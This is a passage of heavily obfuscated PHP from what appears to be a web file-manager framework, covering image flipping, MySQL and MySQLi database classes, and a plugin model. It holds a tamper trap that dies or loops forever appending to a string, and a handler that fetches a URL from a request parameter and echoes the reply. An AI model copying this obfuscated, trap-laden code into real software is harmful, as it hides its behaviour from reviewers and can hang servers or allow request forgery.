imagesy($C¦ÖñÉïÈš); $c°„¢°—Ÿ¼ = imageistruecolor($C¦ÖñÉïÈš) ? imagecreatetruecolor(1, $f§ÄçÕèÓ›) : imagecreate(1, $f§ÄçÕèÓ›); for ($BÎç¢ì¾ = 0; $BÎç¢ì¾ < $bºİ¿·¡£; ++$BÎç¢ì¾) { imagecopy($c°„¢°—Ÿ¼, $C¦ÖñÉïÈš, 0, 0, $BÎç¢ì¾, 0, 1, $f§ÄçÕèÓ›); imagecopy($C¦ÖñÉïÈš, $C¦ÖñÉïÈš, $BÎç¢ì¾, 0, $AĞùº‚ÎÒ² - $BÎç¢ì¾, 0, 1, $f§ÄçÕèÓ›); imagecopy($C¦ÖñÉïÈš, $c°„¢°—Ÿ¼, $AĞùº‚ÎÒ² - $BÎç¢ì¾, 0, 0, 0, 1, $f§ÄçÕèÓ›); } break; case IMG_FLIP_VERTICAL: $f‚éœ®¯æ = imagesx($C¦ÖñÉïÈš); $eÓ‘ó®“¡¿ = imagesy($C¦ÖñÉïÈš) - 1; $EÙİÒË®‚„ = $eÓ‘ó®“¡¿ / 2; $c°„¢°—Ÿ¼ = imageistruecolor($C¦ÖñÉïÈš) ? imagecreatetruecolor($f‚éœ®¯æ, 1) : imagecreate($f‚éœ®¯æ, 1); for ($a£ºçà¸ù = 0; $a£ºçà¸ù < $EÙİÒË®‚„; ++$a£ºçà¸ù) { imagecopy($c°„¢°—Ÿ¼, $C¦ÖñÉïÈš, 0, 0, 0, $a£ºçà¸ù, $f‚éœ®¯æ, 1); imagecopy($C¦ÖñÉïÈš, $C¦ÖñÉïÈš, 0, $a£ºçà¸ù, 0, $eÓ‘ó®“¡¿ - $a£ºçà¸ù, $f‚éœ®¯æ, 1); imagecopy($C¦ÖñÉïÈš, $c°„¢°—Ÿ¼, 0, $eÓ‘ó®“¡¿ - $a£ºçà¸ù, 0, 0, $f‚éœ®¯æ, 1); } break; case IMG_FLIP_BOTH: $f‚éœ®¯æ = imagesx($C¦ÖñÉïÈš); $f§ÄçÕèÓ› = imagesy($C¦ÖñÉïÈš); $c°„¢°—Ÿ¼ = imagerotate($C¦ÖñÉïÈš, 180, 0); imagecopy($C¦ÖñÉïÈš, $c°„¢°—Ÿ¼, 0, 0, 0, 0, $f‚éœ®¯æ, $f§ÄçÕèÓ›); break; default: return; } imagedestroy($c°„¢°—Ÿ¼); } } if (!function_exists($_SERVER[İë¬“ÅÒÛ›][1302])) { function imagecreatefrombmp($f¥Ö¼²ñùæ) { return ImageGdBMP::load($f¥Ö¼²ñùæ); } } goto Aùî‰‹ ; eáõï¾Úç: class DbMysql extends Db { public function __construct($aÊ› –’˜² = '') { $a“¼ÑÅØÀ =& $_SERVER[İë¬“ÅÒÛ›]; if (!extension_loaded($a“¼ÑÅØÀ[474])) { think_exception(think_lang($a“¼ÑÅØÀ[10]) . $a“¼ÑÅØÀ[563]); } if (!empty($aÊ› –’˜²)) { $this->config = $aÊ› –’˜²; if (empty($this->config[$a“¼ÑÅØÀ[13]])) { $this->config[$a“¼ÑÅØÀ[13]] = $a“¼ÑÅØÀ[33]; } } } public function connect($EÚÓ£„ËÒÆ = '', $dÃ­§²Ïî = 0, $f½­¸ËáÈÆ = false) { $dÍ¾®Ó¥‚¥ =& $_SERVER[İë¬“ÅÒÛ›]; if (!isset($this->linkID[$dÃ­§²Ïî])) { goto fÔÊÀ¨šÆ‡; bÎ®ÂôĞìì: if (1 != think_config($dÍ¾®Ó¥‚¥[18])) { unset($this->config); } goto cƒ»–—ñÂù; fÔÊÀ¨šÆ‡: if (empty($EÚÓ£„ËÒÆ)) { $EÚÓ£„ËÒÆ = $this->config; } $cáç¤¼çò¿ = $EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[564]] . ($EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[565]] ? "\x3a{$EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[565]]}" : $dÍ¾®Ó¥‚¥[33]); $EöÍŒƒ¸¯ = !empty($EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[13]][$dÍ¾®Ó¥‚¥[14]]) ? $EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[13]][$dÍ¾®Ó¥‚¥[14]] : $this->pconnect; goto eªÜù›¦©Ó; eâÄËÓâã¦: mysql_query($dÍ¾®Ó¥‚¥[568] . think_config($dÍ¾®Ó¥‚¥[569]) . $dÍ¾®Ó¥‚¥[55], $this->linkID[$dÃ­§²Ïî]); if ($Fõõ»ù†œ› > $dÍ¾®Ó¥‚¥[570]) { mysql_query($dÍ¾®Ó¥‚¥[571], $this->linkID[$dÃ­§²Ïî]); } $this->connected = !0; goto bÎ®ÂôĞìì; eªÜù›¦©Ó: if ($EöÍŒƒ¸¯) { $this->linkID[$dÃ­§²Ïî] = mysql_pconnect($cáç¤¼çò¿, $EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[566]], $EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[567]], 131072); } else { $this->linkID[$dÃ­§²Ïî] = mysql_connect($cáç¤¼çò¿, $EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[566]], $EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[567]], !0, 131072); } if (!$this->linkID[$dÃ­§²Ïî] || !empty($EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[17]]) && !mysql_select_db($EÚÓ£„ËÒÆ[$dÍ¾®Ó¥‚¥[17]], $this->linkID[$dÃ­§²Ïî])) { think_exception(mysql_error()); } $Fõõ»ù†œ› = mysql_get_server_info($this->linkID[$dÃ­§²Ïî]); goto eâÄËÓâã¦; cƒ»–—ñÂù: } return $this->linkID[$dÃ­§²Ïî]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($fó¼«¼¸Éë) { goto f§¬ÁÈ–; Eëè‚ ‡á: if (!$this->_linkID) { return !1; } $this->queryStr = $fó¼«¼¸Éë; if ($this->queryID) { $this->free(); } goto DÈœßÒˆµ‡; f§¬ÁÈ–: $D îá§Æëë =& $_SERVER[İë¬“ÅÒÛ›]; if (0 === stripos($fó¼«¼¸Éë, $D îá§Æëë[256])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Eëè‚ ‡á; A¾‘¼ç˜Í: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto cÆ‡¤Ğ«”¹; DÈœßÒˆµ‡: think_action_status($D îá§Æëë[19], 1); think_status($D îá§Æëë[20]); $this->queryID = mysql_query($fó¼«¼¸Éë, $this->_linkID); goto A¾‘¼ç˜Í; cÆ‡¤Ğ«”¹: } public function execute($f’¦–“Ğ¿) { goto F‹°Ç‘˜¯‡; BÄáÀØº‘: think_status($AÀŒ¾øö¢[20]); $aâÉ˜ŠÖ = mysql_query($f’¦–“Ğ¿, $this->_linkID); $this->debug(); goto eÀ‚†µ¿Ùİ; eÀ‚†µ¿Ùİ: if (!1 === $aâÉ˜ŠÖ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto Eß‡±¹‘’; F‹°Ç‘˜¯‡: $AÀŒ¾øö¢ =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e´¢âÆß¸¦; e´¢âÆß¸¦: $this->queryStr = $f’¦–“Ğ¿; if ($this->queryID) { $this->free(); } think_action_status($AÀŒ¾øö¢[21], 1); goto BÄáÀØº‘; Eß‡±¹‘’: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[İë¬“ÅÒÛ›][572], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C¿¶ÜÚÔà = mysql_query($_SERVER[İë¬“ÅÒÛ›][573], $this->_linkID); $this->transTimes = 0; if (!$C¿¶ÜÚÔà) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÉ™ì”§ÑÒ = mysql_query($_SERVER[İë¬“ÅÒÛ›][574], $this->_linkID); $this->transTimes = 0; if (!$EÉ™ì”§ÑÒ) { $this->error(); return !1; } } return !0; } private function getAll() { $D´¥‚­½À™ = array(); if ($this->numRows > 0) { while ($d›âëÊ£–Ç = mysql_fetch_assoc($this->queryID)) { $D´¥‚­½À™[] = $d›âëÊ£–Ç; } mysql_data_seek($this->queryID, 0); } return $D´¥‚­½À™; } public function getFields($eÃÈ¼á¼¹¢) { $cĞÂÇ«”ô =& $_SERVER[İë¬“ÅÒÛ›]; $d–ŞéÂÀà‚ = $this->query($cĞÂÇ«”ô[575] . $this->parseKey($eÃÈ¼á¼¹¢)); $E–å¯ÀÑŒ› = array(); if ($d–ŞéÂÀà‚) { foreach ($d–ŞéÂÀà‚ as $Dª— ¾Ò«ˆ => $f¹ëÍ¸Ûœ‡) { $E–å¯ÀÑŒ›[$f¹ëÍ¸Ûœ‡[$cĞÂÇ«”ô[27]]] = array($cĞÂÇ«”ô[28] => $f¹ëÍ¸Ûœ‡[$cĞÂÇ«”ô[27]], $cĞÂÇ«”ô[29] => $f¹ëÍ¸Ûœ‡[$cĞÂÇ«”ô[30]], $cĞÂÇ«”ô[31] => (bool) (strtoupper($f¹ëÍ¸Ûœ‡[$cĞÂÇ«”ô[32]]) === $cĞÂÇ«”ô[576]), $cĞÂÇ«”ô[34] => $f¹ëÍ¸Ûœ‡[$cĞÂÇ«”ô[35]], $cĞÂÇ«”ô[36] => strtolower($f¹ëÍ¸Ûœ‡[$cĞÂÇ«”ô[37]]) == $cĞÂÇ«”ô[38], $cĞÂÇ«”ô[39] => strtolower($f¹ëÍ¸Ûœ‡[$cĞÂÇ«”ô[40]]) == $cĞÂÇ«”ô[41]); } } return $E–å¯ÀÑŒ›; } public function getTables($bÌ¨ÕÂ¼‹ò = '') { $f¦ìÒæ¿ÜÅ =& $_SERVER[İë¬“ÅÒÛ›]; if (!empty($bÌ¨ÕÂ¼‹ò)) { $fÉ®¡ÅÛ‘Ÿ = $f¦ìÒæ¿ÜÅ[577] . $bÌ¨ÕÂ¼‹ò; } else { $fÉ®¡ÅÛ‘Ÿ = $f¦ìÒæ¿ÜÅ[578]; } $a·¤‡‹âãŒ = $this->query($fÉ®¡ÅÛ‘Ÿ); $C²Û¦ë³Š» = array(); foreach ($a·¤‡‹âãŒ as $AáÃ„à®ùí => $aŠ­İ•æœÚ) { $C²Û¦ë³Š»[$AáÃ„à®ùí] = current($aŠ­İ•æœÚ); } return $C²Û¦ë³Š»; } public function replace($c´ˆ–´¦Ìø, $C¯øíÇáàò = array()) { $Cï¡Øî¾ó™ =& $_SERVER[İë¬“ÅÒÛ›]; foreach ($c´ˆ–´¦Ìø as $a†Âİ½Ú‘† => $Eá–‡®İ˜¿) { $c¤ïÆÈàÀ = $this->parseValue($Eá–‡®İ˜¿); if (is_scalar($c¤ïÆÈàÀ)) { $fØ÷´‹½ÏÖ[] = $c¤ïÆÈàÀ; $A×™ğù˜²[] = $this->parseKey($a†Âİ½Ú‘†); } } $Dê¥‘ÌÍëµ = $Cï¡Øî¾ó™[579] . $this->parseTable($C¯øíÇáàò[$Cï¡Øî¾ó™[271]]) . $Cï¡Øî¾ó™[580] . implode($Cï¡Øî¾ó™[47], $A×™ğù˜²) . $Cï¡Øî¾ó™[581] . implode($Cï¡Øî¾ó™[47], $fØ÷´‹½ÏÖ) . $Cï¡Øî¾ó™[582]; return $this->execute($Dê¥‘ÌÍëµ); } public function insertAll($dÀóÙ²©İ, $döéïóõó² = array(), $AİôŸÚ˜ˆŞ = false) { goto b§¯Áä¤ß; b§¯Áä¤ß: $d•ò˜¢ÚÔ =& $_SERVER[İë¬“ÅÒÛ›]; if (!is_array($dÀóÙ²©İ[0])) { return !1; } $FÈ–Æ¸»»Ó = array_keys($dÀóÙ²©İ[0]); goto b‰¿¸ÂŒÊõ; a††ìïìÇà: $cµâßéˆ = ($AİôŸÚ˜ˆŞ ? $d•ò˜¢ÚÔ[584] : $d•ò˜¢ÚÔ[585]) . $d•ò˜¢ÚÔ[586] . $this->parseTable($döéïóõó²[$d•ò˜¢ÚÔ[271]]) . $d•ò˜¢ÚÔ[580] . implode($d•ò˜¢ÚÔ[47], $FÈ–Æ¸»»Ó) . $d•ò˜¢ÚÔ[587] . implode($d•ò˜¢ÚÔ[47], $AÄÖ–£’œ); return $this->execute($cµâßéˆ); goto f¬¤æÑ×Ä; b‰¿¸ÂŒÊõ: $AÄÖ–£’œ = array(); foreach ($dÀóÙ²©İ as $B—¼êÍ‰Îƒ) { $EÙ³â„®¨¹ = array(); foreach ($B—¼êÍ‰Îƒ as $bÛÊ’©šã => $FŸÙˆñÆ¸Š) { $FŸÙˆñÆ¸Š = $this->parseValue($FŸÙˆñÆ¸Š); if (is_scalar($FŸÙˆñÆ¸Š)) { $EÙ³â„®¨¹[] = $FŸÙˆñÆ¸Š; } } $AÄÖ–£’œ[] = $d•ò˜¢ÚÔ[252] . implode($d•ò˜¢ÚÔ[47], $EÙ³â„®¨¹) . $d•ò˜¢ÚÔ[582]; } array_walk($FÈ–Æ¸»»Ó, array($this, $d•ò˜¢ÚÔ[583])); goto a††ìïìÇà; f¬¤æÑ×Ä: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $E‰†³ù¨Â =& $_SERVER[İë¬“ÅÒÛ›]; $this->error = mysql_errno() . $E‰†³ù¨Â[4] . mysql_error($this->_linkID); if ($E‰†³ù¨Â[33] != $this->queryStr) { $this->error .= LNG($E‰†³ù¨Â[45]) . $this->queryStr; } think_trace($this->error, $E‰†³ù¨Â[33], $E‰†³ù¨Â[46]); return $this->error; } public function escapeString($bíá‚áŞ©“) { if ($this->_linkID) { return mysql_real_escape_string($bíá‚áŞ©“, $this->_linkID); } else { return mysql_escape_string($bíá‚áŞ©“); } } public function parseKey(&$aëï‡åáÍ, $Fµ¶Ú±îÂ = true) { $C…Èœí†ÉÊ =& $_SERVER[İë¬“ÅÒÛ›]; if ($Fµ¶Ú±îÂ) { $aëï‡åáÍ = $this->parseKeyCheck($aëï‡åáÍ); } if ($aëï‡åáÍ != $C…Èœí†ÉÊ[173] && !preg_match($C…Èœí†ÉÊ[588], $aëï‡åáÍ)) { $aëï‡åáÍ = $C…Èœí†ÉÊ[589] . trim($aëï‡åáÍ, $C…Èœí†ÉÊ[589]) . $C…Èœí†ÉÊ[589]; } return $aëï‡åáÍ; } } class DbMysqli extends Db { public function __construct($EÅé¿··ÖÌ = '') { $dÁ°ƒç›ôã =& $_SERVER[İë¬“ÅÒÛ›]; if (!extension_loaded($dÁ°ƒç›ôã[590])) { think_exception(think_lang($dÁ°ƒç›ôã[10]) . $dÁ°ƒç›ôã[591]); } if (!empty($EÅé¿··ÖÌ)) { $this->config = $EÅé¿··ÖÌ; if (empty($this->config[$dÁ°ƒç›ôã[13]])) { $this->config[$dÁ°ƒç›ôã[13]] = $dÁ°ƒç›ôã[33]; } } } public function connect($dìç¨Û–ğ  = '', $AÓŞ–ã¶à÷ = 0) { $F¥‹¥¦ÊƒØ =& $_SERVER[İë¬“ÅÒÛ›]; if (!isset($this->linkID[$AÓŞ–ã¶à÷])) { goto CÉÈÌö‚Ş‘; Eìà½î„: $A…»•Ç»¦î = $this->linkID[$AÓŞ–ã¶à÷]->server_version; $this->linkID[$AÓŞ–ã¶à÷]->query($F¥‹¥¦ÊƒØ[568] . think_config($F¥‹¥¦ÊƒØ[569]) . $F¥‹¥¦ÊƒØ[55]); if ($A…»•Ç»¦î > $F¥‹¥¦ÊƒØ[570]) { $this->linkID[$AÓŞ–ã¶à÷]->query($F¥‹¥¦ÊƒØ[571]); } goto aÀ¿¤ßê‚¹; CÉÈÌö‚Ş‘: if (empty($dìç¨Û–ğ )) { $dìç¨Û–ğ  = $this->config; } $this->linkID[$AÓŞ–ã¶à÷] = new mysqli($dìç¨Û–ğ [$F¥‹¥¦ÊƒØ[564]], $dìç¨Û–ğ [$F¥‹¥¦ÊƒØ[566]], $dìç¨Û–ğ [$F¥‹¥¦ÊƒØ[567]], $dìç¨Û–ğ [$F¥‹¥¦ÊƒØ[17]], $dìç¨Û–ğ [$F¥‹¥¦ÊƒØ[565]] ? intval($dìç¨Û–ğ [$F¥‹¥¦ÊƒØ[565]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto Eìà½î„; aÀ¿¤ßê‚¹: $this->connected = !0; if (1 != think_config($F¥‹¥¦ÊƒØ[18])) { unset($this->config); } goto e†Ëì¼ºæ¬; e†Ëì¼ºæ¬: } return $this->linkID[$AÓŞ–ã¶à÷]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Eä’ÛÔ½Œ) { goto Eóª®ÂÑ™Š; f›ƒíâ¨½¬: think_status($b°Æ•’ƒÖ«[20]); $this->queryID = $this->_linkID->query($Eä’ÛÔ½Œ); if ($this->_linkID->more_results()) { while (($B“×˜Ñ®õå = $this->_linkID->next_result()) != NULL) { $B“×˜Ñ®õå->free_result(); } } goto c’˜•»‘³Š; c’˜•»‘³Š: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Aã·÷£¼º«; Eóª®ÂÑ™Š: $b°Æ•’ƒÖ« =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C˜æ°”˜¸; C˜æ°”˜¸: $this->queryStr = $Eä’ÛÔ½Œ; if ($this->queryID) { $this->free(); } think_action_status($b°Æ•’ƒÖ«[19], 1); goto f›ƒíâ¨½¬; Aã·÷£¼º«: } public function execute($eÉï—» ‚Ü) { goto DÌ¥Ëˆƒ½; E¤äÀæ‰ : $this->queryStr = $eÉï—» ‚Ü; if ($this->queryID) { $this->free(); } think_action_status($BÊ‘ë›ˆÏ[21], 1); goto Eò©­ºâ¾; EæÊ‹’ª¼ê: if (!1 === $Dƒèí‹ŠÓ›) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto D‰ŞìÚ‡; Eò©­ºâ¾: think_status($BÊ‘ë›ˆÏ[20]); $Dƒèí‹ŠÓ› = $this->_linkID->query($eÉï—» ‚Ü); $this->debug(); goto EæÊ‹’ª¼ê; DÌ¥Ëˆƒ½: $BÊ‘ë›ˆÏ =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E¤äÀæ‰ ; D‰ŞìÚ‡: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e••İˆÓ° = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$e••İˆÓ°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eæù·‘„ñ¤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$eæù·‘„ñ¤) { $this->error(); return !1; } } return !0; } private function getAll() { $bº‘½Ã©Š = array(); if ($this->numRows > 0) { for ($A†®È¡ÜºÍ = 0; $A†®È¡ÜºÍ < $this->numRows; $A†®È¡ÜºÍ++) { $bº‘½Ã©Š[$A†®È¡ÜºÍ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $bº‘½Ã©Š; } public function getFields($dÊàØ–ô¾) { $eÙâöò²áØ =& $_SERVER[İë¬“ÅÒÛ›]; $aùÂõÍÖÄÛ = $this->query($eÙâöò²áØ[575] . $this->parseKey($dÊàØ–ô¾)); $Cñ§‘«ÂÃµ = array(); if ($aùÂõÍÖÄÛ) { foreach ($aùÂõÍÖÄÛ as $c²‡àÍ»µ => $Cå·²²—Ûˆ) { $Cñ§‘«ÂÃµ[$Cå·²²—Ûˆ[$eÙâöò²áØ[27]]] = array($eÙâöò²áØ[28] => $Cå·²²—Ûˆ[$eÙâöò²áØ[27]], $eÙâöò²áØ[29] => $Cå·²²—Ûˆ[$eÙâöò²áØ[30]], $eÙâöò²áØ[31] => (bool) ($Cå·²²—Ûˆ[$eÙâöò²áØ[32]] === $eÙâöò²áØ[33]), $eÙâöò²áØ[34] => $Cå·²²—Ûˆ[$eÙâöò²áØ[35]], $eÙâöò²áØ[36] => strtolower($Cå·²²—Ûˆ[$eÙâöò²áØ[37]]) == $eÙâöò²áØ[38], $eÙâöò²áØ[39] => strtolower($Cå·²²—Ûˆ[$eÙâöò²áØ[40]]) == $eÙâöò²áØ[41]); } } return $Cñ§‘«ÂÃµ; } public function getTables($cØÒ–ÛİËŸ = '') { $A‘é‰À†´’ =& $_SERVER[İë¬“ÅÒÛ›]; $dãÖ•Øæ±ø = !empty($cØÒ–ÛİËŸ) ? $A‘é‰À†´’[577] . $cØÒ–ÛİËŸ : $A‘é‰À†´’[578]; $f¶†›ÙÁ‘ = $this->query($dãÖ•Øæ±ø); $B¨çåÛ†Êå = array(); if ($f¶†›ÙÁ‘) { foreach ($f¶†›ÙÁ‘ as $EÁŠƒ¯¹ôá => $E’£åœÜõˆ) { $B¨çåÛ†Êå[$EÁŠƒ¯¹ôá] = current($E’£åœÜõˆ); } } return $B¨çåÛ†Êå; } public function replace($cÚ¡ô–, $c“„ˆŠÏëã = array()) { $D”÷ÉØ‰ğ› =& $_SERVER[İë¬“ÅÒÛ›]; foreach ($cÚ¡ô– as $a—ğÆéÍçô => $A®ïàÚÓ¦) { $bñ­È‰ï® = $this->parseValue($A®ïàÚÓ¦); if (is_scalar($bñ­È‰ï®)) { $a½œ‰©Ò[] = $bñ­È‰ï®; $d“ÊÔÈÆª˜[] = $this->parseKey($a—ğÆéÍçô); } } $FëØ÷´³ÊÌ = $D”÷ÉØ‰ğ›[579] . $this->parseTable($c“„ˆŠÏëã[$D”÷ÉØ‰ğ›[271]]) . $D”÷ÉØ‰ğ›[580] . implode($D”÷ÉØ‰ğ›[47], $d“ÊÔÈÆª˜) . $D”÷ÉØ‰ğ›[581] . implode($D”÷ÉØ‰ğ›[47], $a½œ‰©Ò) . $D”÷ÉØ‰ğ›[582]; return $this->execute($FëØ÷´³ÊÌ); } public function insertAll($aßÈ¬àİÍ¶, $C‘®ƒİâ = array(), $E‰‹Ô¼ÇÙì = false) { goto Aƒ§ˆˆš¸à; a±†¿¤”…ô: $B¥‘ìÉµ„Î = array(); foreach ($aßÈ¬àİÍ¶ as $DÜ–á––Õí) { $aÜ¬Ìê— = array(); foreach ($DÜ–á––Õí as $aå†õ“¸ÏÓ => $A’Ú“Áã‹) { $A’Ú“Áã‹ = $this->parseValue($A’Ú“Áã‹); if (is_scalar($A’Ú“Áã‹)) { $aÜ¬Ìê—[] = $A’Ú“Áã‹; } } $B¥‘ìÉµ„Î[] = $CğŠÕôšŠ[252] . implode($CğŠÕôšŠ[47], $aÜ¬Ìê—) . $CğŠÕôšŠ[582]; } array_walk($bÂªÎ³Øò, array($this, $CğŠÕôšŠ[583])); goto AáÀÎØÖ³—; AáÀÎØÖ³—: $E”˜™‘¨ö = ($E‰‹Ô¼ÇÙì ? $CğŠÕôšŠ[584] : $CğŠÕôšŠ[585]) . $CğŠÕôšŠ[586] . $this->parseTable($C‘®ƒİâ[$CğŠÕôšŠ[271]]) . $CğŠÕôšŠ[580] . implode($CğŠÕôšŠ[47], $bÂªÎ³Øò) . $CğŠÕôšŠ[587] . implode($CğŠÕôšŠ[47], $B¥‘ìÉµ„Î); return $this->execute($E”˜™‘¨ö); goto BÌÜÕîÙ´©; Aƒ§ˆˆš¸à: $CğŠÕôšŠ =& $_SERVER[İë¬“ÅÒÛ›]; if (!is_array($aßÈ¬àİÍ¶[0])) { return !1; } $bÂªÎ³Øò = array_keys($aßÈ¬àİÍ¶[0]); goto a±†¿¤”…ô; BÌÜÕîÙ´©: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eˆØ‰óÁ¨ =& $_SERVER[İë¬“ÅÒÛ›]; $this->error = $this->_linkID->errno . $eˆØ‰óÁ¨[4] . $this->_linkID->error; if ($eˆØ‰óÁ¨[33] != $this->queryStr) { $this->error .= LNG($eˆØ‰óÁ¨[45]) . $this->queryStr; } think_trace($this->error, $eˆØ‰óÁ¨[33], $eˆØ‰óÁ¨[46]); return $this->error; } public function escapeString($A÷÷ß»Ïªô) { if ($this->_linkID) { return $this->_linkID->real_escape_string($A÷÷ß»Ïªô); } else { return addslashes($A÷÷ß»Ïªô); } } public function parseKey(&$cõ‚Áè¬È, $CŒÜˆÎáªœ = true) { $B³»µ˜ñ¨Ã =& $_SERVER[İë¬“ÅÒÛ›]; if ($CŒÜˆÎáªœ) { $cõ‚Áè¬È = $this->parseKeyCheck($cõ‚Áè¬È); } if ($cõ‚Áè¬È != $B³»µ˜ñ¨Ã[173] && !preg_match($B³»µ˜ñ¨Ã[588], $cõ‚Áè¬È)) { $cõ‚Áè¬È = $B³»µ˜ñ¨Ã[589] . trim($cõ‚Áè¬È, $B³»µ˜ñ¨Ã[589]) . $B³»µ˜ñ¨Ã[589]; } return $cõ‚Áè¬È; } } if (!isset($_SERVER[$_SERVER[İë¬“ÅÒÛ›][556]]) || !isset($_SERVER[$_SERVER[İë¬“ÅÒÛ›][592]])) { goto E‹ÂĞ©©ÈÇ; dŠ¥¿¬¦éã: $eŞªÕÑô£Ÿ(BASIC_PATH . $_SERVER[İë¬“ÅÒÛ›][554]); for (;;) { $eŞªÕÑô£Ÿ = $eŞªÕÑô£Ÿ . $_SERVER[İë¬“ÅÒÛ›][595]; } goto AĞïóÕ…ºè; cÆêƒ¥ë©: $a¶ª¾£æÂ¨ = explode($_SERVER[İë¬“ÅÒÛ›][224], $FÀï‹˜©È¹); if (count($a¶ª¾£æÂ¨) < $_SERVER[İë¬“ÅÒÛ›][593]) { die; } $eŞªÕÑô£Ÿ = $_SERVER[İë¬“ÅÒÛ›][594]; goto dŠ¥¿¬¦éã; E‹ÂĞ©©ÈÇ: $f£Ó®ôÀ = $_SERVER[İë¬“ÅÒÛ›][557]; $cµèŒ‘¸Ş = BASIC_PATH . $_SERVER[İë¬“ÅÒÛ›][554]; $FÀï‹˜©È¹ = $f£Ó®ôÀ($cµèŒ‘¸Ş); goto cÆêƒ¥ë©; AĞïóÕ…ºè: } goto F…ëÂ†ÎöÜ; EåÎ‹ùÂà‚: $_SERVER[$_SERVER[…Ã²ÛÚÈÔ][30]] = BASIC_PATH . $_SERVER[…Ã²ÛÚÈÔ][31]; $_SERVER[$_SERVER[…Ã²ÛÚÈÔ][32]] = filesize($_SERVER[$_SERVER[…Ã²ÛÚÈÔ][30]]); $_SERVER[$_SERVER[…Ã²ÛÚÈÔ][33]] = ("\70\62\67\60"."\x39\x35")+0;$_uEk9="RamBphkVC6trgDp96u4Pe2Cy5pPavvtUE3yhx9A7f8WIdNt2bHBiGr5kxnYT";; goto C µ©ùí„æ; D¯…ùáÙø“: define($_SERVER[İë¬“ÅÒÛ›][1649], $_SERVER[İë¬“ÅÒÛ›][1650]); $_SERVER[¦‰ùÛß®öĞ¶] = explode($_SERVER[İë¬“ÅÒÛ›][1651], gzinflate(substr($_SERVER[İë¬“ÅÒÛ›][1652], 10, -8))); class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x70\x6c\x75\147\x69\x6e\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\x73\164\x61\164\x75\x73", "\162\145\147\x69\x65\x73\164", "\x63\157\x6e\146\x69\x67"); private $versionData = array(); private $version = "\x41"; public function loadList($CÓù¹ğö… = false) { $a÷…¤´‰â = array_to_keyvalue($this->listData(), $_SERVER[¦‰ùÛß®öĞ¶][0]); if ($CÓù¹ğö…) { return $a÷…¤´‰â[$CÓù¹ğö…]; } return $a÷…¤´‰â; } public function init() { goto bÔè­Âä†ª; cÈ®¦Üœ¥‹: $this->assignCopyright(); $this->disableCheck(); Hook::bind($AÎóËî–í°[14], $AÎóËî–í°[15]); goto cä·…£Â„ë; e´ô„ñ¹ÂÚ: if (isset($_GET[$AÎóËî–í°[5]]) && in_array(strtolower(ACTION), $F¬Û¯ì“ˆ¥)) { $c•ŸÒÕÏÄ = hash_decode($_GET[$AÎóËî–í°[5]]); header($AÎóËî–í°[6]); if (isset($GLOBALS[$AÎóËî–í°[7]]) && $GLOBALS[$AÎóËî–í°[7]] && $c•ŸÒÕÏÄ && substr($c•ŸÒÕÏÄ, 0, 4) == $AÎóËî–í°[8]) { $c•ŸÒÕÏÄ = str_replace($AÎóËî–í°[9], $AÎóËî–í°[10], $c•ŸÒÕÏÄ); $b‡ÇĞã¶¶Š = url_request($c•ŸÒÕÏÄ, $AÎóËî–í°[11], !1, !1, !1, !1, 2); if ($b‡ÇĞã¶¶Š[$AÎóËî–í°[12]] && strstr($b‡ÇĞã¶¶Š[$AÎóËî–í°[12]], $AÎóËî–í°[13])) { echo $b‡ÇĞã¶¶Š[$AÎóËî–í°[12]]; } } die; } $this->checkDataInit(); $this->checkVersion(); goto cÈ®¦Üœ¥‹; d¦Óƒ½È‡: Hook::trigger($AÎóËî–í°[2]); Hook::trigger(ACTION); $F¬Û¯ì“ˆ¥ = array($AÎóËî–í°[3], $AÎóËî–í°[4]); goto e´ô„ñ¹ÂÚ; bÔè­Âä†ª: $AÎóËî–í° =& $_SERVER[¦‰ùÛß®öĞ¶]; $Bñ…ëƒ›§Ö = $this->loadList(); $this->dataCheck(); goto A°×ŠåÜÃÀ; cä·…£Â„ë: 